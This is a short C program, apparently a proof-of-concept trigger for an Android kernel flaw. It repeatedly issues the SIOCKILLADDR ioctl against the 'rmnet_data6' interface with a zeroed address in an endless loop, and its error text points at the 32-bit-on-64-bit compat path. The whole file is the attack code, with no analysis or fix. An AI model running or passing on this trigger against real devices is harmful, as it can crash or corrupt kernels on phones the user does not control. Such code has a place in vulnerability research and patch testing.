#include <string.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>


#ifndef SIOCKILLADDR
#define SIOCKILLADDR 0x8939
#endif

void tcp_nuke() {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    struct sockaddr_in listenaddr;
    memset(&listenaddr, 0, sizeof(listenaddr));
    listenaddr.sin_family = AF_INET;
    strncpy(ifr.ifr_name, "rmnet_data6", strlen("rmnet_data6"));
    memcpy(&ifr.ifr_addr, &listenaddr, sizeof(listenaddr));

    int ioctlsock = socket(AF_INET, SOCK_DGRAM, 0);
    if (ioctlsock == -1) {
        perror("ioctlsock");
        exit(-1);
    }
    if (ioctl(ioctlsock, SIOCKILLADDR, &ifr) != 0) {
        perror("SIOCKILLADDR failed, did you run 32-bit userspace on a 64-bit kernel?");
        exit(-1);
    }
    close(ioctlsock);
}

int main(void) {
  while(1) {
    tcp_nuke();
  }
}
